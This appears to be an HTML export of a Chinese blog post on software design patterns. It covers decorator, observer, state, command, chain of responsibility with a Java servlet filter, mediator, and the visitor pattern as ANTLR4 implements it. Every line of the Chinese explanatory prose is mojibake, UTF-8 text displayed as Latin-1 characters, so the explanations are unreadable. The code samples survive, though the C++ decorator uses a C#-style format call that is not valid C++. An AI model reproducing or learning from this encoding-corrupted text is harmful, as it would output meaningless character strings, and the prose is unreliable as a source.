<p>å»é™¤å­ç±»ä¸­çš„é‡å¤ä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flavour</span> :</span>public  Component&#123;      <span class="comment">//Decorator</span></span><br><span class="line">    private:</span><br><span class="line">    Component* component;</span><br><span class="line">    public:</span><br><span class="line">    <span class="type">void</span> <span class="title function_">setComponent</span><span class="params">(Component* c)</span>&#123;</span><br><span class="line">        component = c;</span><br><span class="line">    &#125;</span><br><span class="line">    virtual <span class="built_in">string</span> <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Flavour&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">string</span> str = format(<span class="string">&quot;(&#123;0&#125;),&#123;1&#125;&quot;</span>,component-&gt;toString(),getName());</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ice</span>:</span> public Flavour&#123;</span><br><span class="line">    public:</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Ice&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Milk</span>:</span>public Flavour&#123;</span><br><span class="line">    public:</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Milk&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡ŒgetNameå°±æ˜¯æ¨¡æ¿æ–¹æ³•</p>
<h4 id="è§‚å¯Ÿè€…æ¨¡å¼"><a href="#è§‚å¯Ÿè€…æ¨¡å¼" class="headerlink" title="è§‚å¯Ÿè€…æ¨¡å¼"></a>è§‚å¯Ÿè€…æ¨¡å¼</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250412132737631.png" alt="image-20250411165606763"></p>
<p>å‘å¸ƒè€…-è®¢é˜…è€…æ¨¡å¼</p>
<h4 id="çŠ¶æ€æ¨¡å¼"><a href="#çŠ¶æ€æ¨¡å¼" class="headerlink" title="çŠ¶æ€æ¨¡å¼"></a>çŠ¶æ€æ¨¡å¼</h4><p>æ§åˆ¶ä¸€ä¸ªå¯¹è±¡çŠ¶æ€è½¬ç§»çš„è¡¨è¾¾å¼<strong>è¿‡äºå¤æ‚æ—¶</strong>(å¦‚æœç®€å•å°±ä¸éœ€è¦ç”¨çŠ¶æ€æ¨¡å¼)</p>
<p>å°†çŠ¶æ€åˆ¤æ–­çš„if-elseé€»è¾‘, è½¬ç§»åˆ°è¡¨ç¤ºä¸åŒçŠ¶æ€çš„ä¸€ç³»åˆ—<strong>ç±»ä¸­è¡¨ç¤º</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250418165848590.png" alt="image-20250412143515765"></p>
<h4 id="å¤‡å¿˜å½•æ¨¡å¼"><a href="#å¤‡å¿˜å½•æ¨¡å¼" class="headerlink" title="å¤‡å¿˜å½•æ¨¡å¼"></a>å¤‡å¿˜å½•æ¨¡å¼</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416165605748.png" alt="image-20250416165603725"></p>
<h4 id="è¿­ä»£å™¨æ¨¡å¼"><a href="#è¿­ä»£å™¨æ¨¡å¼" class="headerlink" title="è¿­ä»£å™¨æ¨¡å¼"></a>è¿­ä»£å™¨æ¨¡å¼</h4><h4 id="å‘½ä»¤æ¨¡å¼"><a href="#å‘½ä»¤æ¨¡å¼" class="headerlink" title="å‘½ä»¤æ¨¡å¼"></a>å‘½ä»¤æ¨¡å¼</h4><p>å‘½ä»¤æ¨¡å¼å°†ä¸€ä¸ªè¯·æ±‚å°è£…ä¸ºä¸€ä¸ªå¯¹è±¡, å¯¹è±¡æ•°ç»„å°±èƒ½æ¨¡æ‹Ÿè¯·æ±‚é˜Ÿåˆ—, å¯ä»¥å®ç°å»¶è¿Ÿè¯·æ±‚, è¯·æ±‚æ’é˜Ÿ</p>
<p>åŒæ—¶, å°†è¯·æ±‚å¯¹è±¡åŒ–, æ–¹ä¾¿äº†è®°å½•è¯·æ±‚æ—¥å¿—, å¯¹è±¡è®°å½•è¯·æ±‚å†…å®¹, ä¹Ÿå°±æ”¯æŒäº†æ’¤é”€æ“ä½œ</p>
<p>Receiver: å®é™…æ‰§è¡Œå‘½ä»¤çš„å¯¹è±¡</p>
<p>Command: å‘½ä»¤ç±»å‹çˆ¶ç±», Commandå¯ä»¥æœ‰ä¸åŒå­ç±»å®šä¹‰å®é™…çš„å‘½ä»¤ç±»å‹</p>
<p>Invoker: ä½¿ç”¨Commandçš„å…¥å£, ä¹Ÿå°±æ˜¯å°è£…å‘½ä»¤çš„å¯¹è±¡</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420182349051.png" alt="image-20250420182347577"></p>
<p>å¦‚å›¾æ‰€ç¤º, è¿™æ˜¯ä¸€ä¸ªshellå‘½ä»¤æ‰§è¡Œå™¨.</p>
<p>å…¶ä¸­Executorå°±æ˜¯å®é™…å‘½ä»¤æ‰§è¡Œå™¨, ä¹Ÿå°±æ˜¯Receiver, å…¶executeå‚æ•°æ¥å—ä¸€ä¸ªshellå‘½ä»¤å­—ç¬¦ä¸², å¹¶è°ƒç”¨systemå‡½æ•°æ‰§è¡Œä¹‹</p>
<p>Commandæ˜¯å‘½ä»¤ç±»å‹åŸºç±», å…¶getCommandç±»å‹æ±‡æŠ¥è‡ªå·±å¯¹åº”çš„shellå‘½ä»¤, å…¶executeè´Ÿè´£æ‹¼æ¥shellå‘½ä»¤ä¸å‚æ•° ,å¹¶äº¤ç”±Executoræ‰§è¡Œ. Commandç±»ä¸­æŒæœ‰ä¸€ä¸ªExecutorçš„å¼•ç”¨executor</p>
<p>Invokeræ˜¯å°è£…çš„ä¸€æ¬¡å‘½ä»¤æ‰§è¡Œ, åœ¨Invokerä¸­è®¾ç½®å¥½å‚æ•°ä¸å¯¹åº”å‘½ä»¤ç±», å³å¯åœ¨ä»»æ„æ—¶åˆ»è°ƒç”¨invokeæ‰§è¡Œå‘½ä»¤</p>
<blockquote>
<p>invokeå’Œcallçš„åŒºåˆ«:</p>
<p>ä¸¤è€…éƒ½ç”¨äºè¡¨ç¤ºâ€œè°ƒç”¨â€</p>
<p>callé€šå¸¸æŒ‡ç›´æ¥çš„å‡½æ•°è°ƒç”¨, ç›´æ¥ä½¿ç”¨å‡½æ•°åè°ƒç”¨</p>
<p>invokeé€šå¸¸æŒ‡åŠ¨æ€ä¸Šä¸‹æ–‡ä¸­,ä½¿ç”¨åå°„&#x2F;å§”æ‰˜&#x2F;å›è°ƒç­‰åœºæ™¯</p>
</blockquote>
<h4 id="èŒè´£é“¾æ¨¡å¼"><a href="#èŒè´£é“¾æ¨¡å¼" class="headerlink" title="èŒè´£é“¾æ¨¡å¼"></a>èŒè´£é“¾æ¨¡å¼</h4><p>è¿‡æ»¤å™¨å’Œæ‹¦æˆªå™¨å‡é‡‡ç”¨èŒè´£é“¾æ¨¡å¼</p>
<p>ä»¥è¿‡æ»¤å™¨ä¸ºä¾‹, è¿‡æ»¤å™¨é€šå¸¸åº”ç”¨äºç”¨æˆ·æƒé™æ£€æŸ¥&#x2F;é˜²æ­¢ä¹±ç &#x2F;è®¾ç½®å“åº”ç¼–ç ç­‰åœºæ™¯</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420210150821.webp" alt="img"></p>
<p>åœ¨javawebç¼–ç¨‹ä¸­æ³¨å†Œä¸€ä¸ªè¿‡æ»¤å™¨éå¸¸æ–¹ä¾¿:</p>
<p>1.å®ç°è¿‡æ»¤å™¨ç±»</p>
<p>2.åœ¨web.xmlä¸­æ³¨å†Œè¿‡æ»¤å™¨æ˜ å°„</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>logFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.xzg.cd.LogFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>logFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å®Œç¾ç¬¦åˆå¼€æ”¾-å°é—­åŸåˆ™</p>
<p>çœ‹ä¸€ä¸‹æ—¶åºå›¾, å¯ä»¥å‘ç°å„ä¸ªFilteræ˜¯é€’å½’è°ƒç”¨çš„, è€Œä¸æ˜¯å¹³è¡Œåœ°éå†äº†ä¸€é</p>
<blockquote>
<p>å›¾æ¥è‡ª<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cenyu/p/6200495.html#12%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F">Servletè¿‡æ»¤å™¨ - æ´‹è‘±æºç  - åšå®¢å›­</a></p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420212542498.png" alt="img"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span><br><span class="line"><span class="params">		FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">	<span class="comment">//prehandler</span></span><br><span class="line">	chain.doFilter(request, response);</span><br><span class="line">       <span class="comment">//posthandler</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>UMLç±»å›¾è¡¨ç¤ºä¸º:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420220616312.png" alt="image-20250420220614007"></p>
<p>èŒè´£é“¾æ¨¡å¼æœ‰ä¸€ä¸ªé“¾ç®¡ç†å™¨, ä¹Ÿå°±æ˜¯FilterChain, å…¶ä¸­å¯ä»¥æœ‰å¤šä¸ªèŒè´£ç±», ç†æƒ³çŠ¶æ€ä¸‹æ¯ä¸ªæŒ‡è´£ç±»åªè´Ÿè´£ä¸€ç§èŒè´£, æ¯”å¦‚å­—ç¬¦è¿‡æ»¤å™¨åªè´Ÿè´£è¿‡æ»¤è¾“å…¥ä¸­çš„å±é™©å­—ç¬¦, å¤§å†™è¿‡æ»¤å™¨åªè´Ÿè´£å°†è¾“å‡ºä¸­æ‰€æœ‰å°å†™å­—ç¬¦è½¬åŒ–æˆå¤§å†™</p>
<p>å„ä¸ªèŒè´£å¯ä»¥é‡‡ç”¨é€’å½’åµŒå¥—, ä¹Ÿå¯ä»¥å¹³è¡Œéå†.</p>
<p>ä½†æ˜¯åœ¨Filterè¿™é‡Œç”±äºæœ‰preå’Œpostä¸¤ä¸ªå¤„ç†å‡½æ•°, åªèƒ½é‡‡å–é€’å½’</p>
<h4 id="ä¸­ä»‹è€…æ¨¡å¼"><a href="#ä¸­ä»‹è€…æ¨¡å¼" class="headerlink" title="ä¸­ä»‹è€…æ¨¡å¼"></a>ä¸­ä»‹è€…æ¨¡å¼</h4><p>ä¸­ä»‹è€…æ¨¡å¼é€šè¿‡å¼•å…¥ä¸­ä»‹è€…ç±»ï¼Œå°†åŸæœ¬æ¨¡å—ä¹‹é—´äº’ç›¸è°ƒç”¨çš„å…³ç³»ï¼Œ è½¬åŒ–ä¸ºç»è¿‡ä¸­ä»‹è€…æ²Ÿé€šçš„æ¨¡å¼ï¼Œ å®ç°äº†æ¨¡å—é—´è§£è€¦</p>
<p>æˆ¿åœ°äº§äº¤æµå¹³å°æ˜¯â€œæˆ¿åœ°äº§ä¸­ä»‹å…¬å¸â€æä¾›ç»™â€œå–æ–¹å®¢æˆ·â€ä¸â€œä¹°æ–¹å®¢æˆ·â€è¿›è¡Œä¿¡æ¯äº¤æµçš„å¹³å°ï¼Œæ¯”è¾ƒé€‚åˆç”¨ä¸­ä»‹è€…æ¨¡å¼æ¥å®ç°ã€‚</p>
<p>èŠå¤©å®¤ä¸­serverä½œä¸ºä¸­ä»‹è€…</p>
<p>å®é™…ä¸Šæ˜¯æ˜ŸçŠ¶ç»“æ„</p>
<h4 id="è§£é‡Šå™¨æ¨¡å¼"><a href="#è§£é‡Šå™¨æ¨¡å¼" class="headerlink" title="è§£é‡Šå™¨æ¨¡å¼"></a>è§£é‡Šå™¨æ¨¡å¼</h4><p>å†åˆ«å¤šè¯´, ç»™å®šä¸€ä¸ªè¯­è¨€, å®šä¹‰å…¶è¯­æ³•è¡¨ç¤º, å¹¶å®šä¹‰è§£é‡Šå™¨, ç”¨è§£é‡Šå™¨æ¥è§£é‡Šè¯¥è¯­è¨€ä¸­çš„å¥å­</p>
<h4 id="è®¿é—®è€…æ¨¡å¼"><a href="#è®¿é—®è€…æ¨¡å¼" class="headerlink" title="è®¿é—®è€…æ¨¡å¼"></a>è®¿é—®è€…æ¨¡å¼</h4><p>ä»¥Antlr4çš„å®ç°ä¸ºä¾‹, å­¦ä¹ å…¶è®¿é—®è€…æ¨¡å¼çš„å®ç°</p>
<h5 id="è®¿é—®è€…æ¨¡å¼çš„ä½œç”¨æ—¶æœº"><a href="#è®¿é—®è€…æ¨¡å¼çš„ä½œç”¨æ—¶æœº" class="headerlink" title="è®¿é—®è€…æ¨¡å¼çš„ä½œç”¨æ—¶æœº"></a>è®¿é—®è€…æ¨¡å¼çš„ä½œç”¨æ—¶æœº</h5><p>ç¼–è¯‘å™¨å‰ç«¯ç”±è¯æ³•åˆ†æå™¨lexerå’Œè¯­æ³•åˆ†æå™¨parserç»„æˆ, å‰ç«¯çš„ä½œç”¨æ—¶, è¾“å…¥ä¸€æ®µç›®æ ‡è¯­è¨€çš„æºä»£ç , è¾“å‡ºè¯­æ³•æ ‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source code ====&gt; front end ====&gt; grammer tree</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘å™¨åç«¯å°±æ˜¯è¯­ä¹‰åˆ†æ, åœ¨antlr4ä¸­è¯­ä¹‰åˆ†æå¯ä»¥é‡‡ç”¨è®¿é—®è€…æ¨¡å¼ æˆ–è€… ç›‘å¬è€…æ¨¡å¼å®ç°. åç«¯çš„ä½œç”¨æ˜¯, è¾“å…¥ä¸€ä¸ªè¯­æ³•æ ‘, è¿›è¡Œè¯­ä¹‰åˆ†æ, ä¹Ÿå°±æ˜¯è§£é‡Š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grammer tree ====&gt; back end ====&gt; semantic analyze</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­visitorå°±åœ¨<code>ç¼–è¯‘å™¨åç«¯====&gt;è¯­ä¹‰ç»“æœ</code>è¿™ä¸€æ­¥å‘æŒ¥ä½œç”¨</p>
<h5 id="è¯­æ³•æ ‘èŠ‚ç‚¹ç»“æ„"><a href="#è¯­æ³•æ ‘èŠ‚ç‚¹ç»“æ„" class="headerlink" title="è¯­æ³•æ ‘èŠ‚ç‚¹ç»“æ„"></a>è¯­æ³•æ ‘èŠ‚ç‚¹ç»“æ„</h5><p>é‚£ä¹ˆvisitorçš„å‚æ•°å°±æ˜¯è¯­æ³•æ ‘çš„rootèŠ‚ç‚¹</p>
<p>æ‰€æœ‰è¯­æ³•æ ‘èŠ‚ç‚¹çš„æ¥å£:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ParseTree</span> <span class="keyword">extends</span> <span class="title class_">SyntaxTree</span> &#123;</span><br><span class="line">    ParseTree <span class="title function_">getParent</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    ParseTree <span class="title function_">getChild</span><span class="params">(<span class="type">int</span> childindex)</span>;		<span class="comment">//è¿”å›ç¬¬childindexä¸ªå­èŠ‚ç‚¹çš„ä¸‹æ ‡</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setParent</span><span class="params">(RuleContext var1)</span>;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; var1)</span>;	<span class="comment">//ä¸ºäº†å®ç°è®¿é—®è€…æ¨¡å¼, éœ€è¦æ¯ä¸ªè¯­æ³•æ ‘èŠ‚ç‚¹å®ç°acceptæ¥å£</span></span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getText</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">toStringTree</span><span class="params">(Parser var1)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰€æœ‰è¯­æ³•èŠ‚ç‚¹ç±»çš„æŠ½è±¡çˆ¶ç±»:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserRuleContext</span> <span class="keyword">extends</span> <span class="title class_">RuleContext</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;ParseTree&gt; children;		<span class="comment">//å­˜æ”¾å­èŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">public</span> Token start;</span><br><span class="line">    <span class="keyword">public</span> Token stop;</span><br><span class="line">    <span class="keyword">public</span> RecognitionException exception;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…·ä½“çš„è¯­æ³•èŠ‚ç‚¹ç±»ç”±.g4è§„åˆ™æ–‡ä»¶ç»™å‡º, è¿™ä¸ªg4æ–‡ä»¶å°±æ˜¯äººå·¥æ’°å†™çš„è¯æ³•è¯­æ³•è§„åˆ™æ–‡ä»¶, æ¯”å¦‚:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">program :  ( statement SEMICO )*  EOF  ;</span><br><span class="line"></span><br><span class="line">statement :  scaleStatment | rotStatment    | forStatment |statColor |statSize |  originStatment|statVar  ;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250421211024147.png" alt="image-20250421211020863"></p>
<p>antlr4ä¼šåœ¨å¤„ç†g4æ–‡ä»¶æ—¶, å°†<code>program</code>è¯­æ³•å¯¹åº”å»ºç«‹ä¸€ä¸ª<code>ProgramContext</code>è¯­æ³•æ ‘èŠ‚ç‚¹ç±»</p>
<p>åŒæ ·<code>statement</code>è¯­æ³•ä¹Ÿä¼šå»ºç«‹ä¸€ä¸ª<code>StatementContext</code>è¯­æ³•æ ‘èŠ‚ç‚¹ç±»</p>
<h5 id="è¯­æ³•æ ‘èŠ‚ç‚¹çš„acceptæ¥å£"><a href="#è¯­æ³•æ ‘èŠ‚ç‚¹çš„acceptæ¥å£" class="headerlink" title="è¯­æ³•æ ‘èŠ‚ç‚¹çš„acceptæ¥å£"></a>è¯­æ³•æ ‘èŠ‚ç‚¹çš„acceptæ¥å£</h5><p>åœ¨<code>ParseTree</code>æ¥å£ä¸­è§„å®š, ä¸ºäº†èƒ½å¤Ÿä½¿ç”¨<code>visitor</code>æ¨¡å¼, éœ€è¦æ¯ä¸ªè¯­æ³•æ ‘èŠ‚ç‚¹å®ç°<code>accept</code>æ¥å£</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; var1)</span>;</span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚<code>ProgramContext</code>èŠ‚ç‚¹ç±»æ˜¯è¿™æ ·å®ç°çš„:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ProgramContext</span> <span class="keyword">extends</span> <span class="title class_">ParserRuleContext</span> &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> DrawGraphVisitor ) <span class="keyword">return</span> ((DrawGraphVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitProgram(<span class="built_in">this</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯ç›´æ¥è°ƒç”¨äº†<code>DrawGraphVisitor.visitProgram()</code></p>
<p>åˆæ¯”å¦‚<code>StatScaleContext</code>èŠ‚ç‚¹ç±»è¿™æ ·å®ç°:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static class StatScaleContext extends ScaleStatmentContext &#123;</span><br><span class="line">...</span><br><span class="line">	@Override</span><br><span class="line">	public &lt;T&gt; T accept(ParseTreeVisitor&lt;? extends T&gt; visitor) &#123;</span><br><span class="line">		if ( visitor instanceof DrawGraphVisitor ) return ((DrawGraphVisitor&lt;? extends T&gt;)visitor).visitStatScale(this);</span><br><span class="line">		else return visitor.visitChildren(this);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯ç›´æ¥è°ƒç”¨äº†<code>DrawGraphVisitor.visitStatScale()</code></p>
<p>æ•´ä¸ªè¿‡ç¨‹æ˜¯è¿™æ ·çš„:</p>
<p>è®¿é—®è€…: èŠ‚ç‚¹, æˆ‘èƒ½è®¿é—®ä½ å—? æˆ‘åº”è¯¥æ€ä¹ˆè®¿é—®ä½ å‘¢? </p>
<p><code>StateScaleContext</code>èŠ‚ç‚¹: åŒæ„è®¿é—®, ä½ å¾—å»ç”¨ä½ çš„<code>visitStatScale</code>æ–¹æ³•æ¥è®¿é—®æˆ‘.</p>
<p>ä¸ºä»€ä¹ˆè®¿é—®è€…ä¸èƒ½ç›´æ¥è°ƒç”¨è‡ªå·±çš„<code>visitStatScale</code>æ–¹æ³•, è€Œæ˜¯å…ˆè°ƒç”¨èŠ‚ç‚¹çš„acceptæ–¹æ³•å‘¢?</p>
<p>è¿™æ˜¯å› ä¸º, å½“è®¿é—®è€…æ¥åˆ°å½“å‰èŠ‚ç‚¹å®¶é—¨å£æ—¶, è®¿é—®è€…å¹¶ä¸çŸ¥é“å½“å‰èŠ‚ç‚¹æ˜¯ä¸ªä»€ä¹ˆå…·ä½“ç±»å‹çš„èŠ‚ç‚¹, è®¿é—®è€…åªçŸ¥é“èŠ‚ç‚¹çš„å¤šæ€åŸºç±».</p>
<p>å› æ­¤è®¿é—®è€…ä¸çŸ¥é“åº”è¯¥å¯¹å½“å‰èŠ‚ç‚¹è¿›è¡Œä»€ä¹ˆæ“ä½œ, å› æ­¤èŠ‚ç‚¹éœ€è¦åœ¨è‡ªå·±çš„acceptå‡½æ•°ä¸­, å‘ŠçŸ¥è®¿é—®è€…è®¿é—®åè®®, ä¹Ÿå°±æ˜¯ç”±èŠ‚ç‚¹æŒ‡å¼•è®¿é—®è€…è®¿é—®å½“å‰èŠ‚ç‚¹çš„æ–¹æ³•</p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯, <code>visitProgram</code>è¿™ç§å…·ä½“çš„è®¿é—®åè®®æ˜¯å¦‚ä½•å®ç°çš„?</p>
<table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>ç±»å</th>
<th>èŒè´£</th>
<th>ä½ç½®</th>
</tr>
</thead>
<tbody><tr>
<td>æ¥å£</td>
<td>ParseTreeVisitor</td>
<td>å£°æ˜visitæ¥å£, visitChildrenæ¥å£ç­‰</td>
<td>jaråº“</td>
</tr>
<tr>
<td>æŠ½è±¡ç±»</td>
<td>AbstractParseTreeVisitor</td>
<td>å®ç°visitæ¥å£, visitChildrenæ¥å£ç­‰</td>
<td>jaråº“</td>
</tr>
<tr>
<td>ç±»</td>
<td>DrawGraphBaseVisitor</td>
<td>å®ç°é»˜è®¤çš„visitStatScaleç­‰å…·ä½“åè®®</td>
<td>antlr4å‘½ä»¤ç”Ÿæˆ</td>
</tr>
<tr>
<td>ç±»</td>
<td>EvalVisitor</td>
<td>è‡ªå®šä¹‰visitStatScaleç­‰å…·ä½“åè®®</td>
<td>ç¨‹åºå‘˜æ’°å†™</td>
</tr>
</tbody></table>
<p><code>DrawGraphBaseVisitor</code>ç”±antlr4è‡ªåŠ¨ç”Ÿæˆ, å…¶ä¸­å®šä¹‰äº†é»˜è®¤çš„è®¿é—®åè®®æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DrawGraphBaseVisitor</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">AbstractParseTreeVisitor</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">DrawGraphVisitor</span>&lt;T&gt; &#123;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitProgram</span><span class="params">(DrawGraphParser.ProgramContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitStatement</span><span class="params">(DrawGraphParser.StatementContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">    ...</span><br><span class="line">       <span class="meta">@Override</span> <span class="keyword">public</span> Double <span class="title function_">visitStatScale</span><span class="params">(DrawGraphParser.StatScaleContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯è§é»˜è®¤çš„æ–¹æ³•æ˜¯ç›´æ¥è®¿é—®å­èŠ‚ç‚¹å», èµ°é©¬è§‚èŠ±</p>
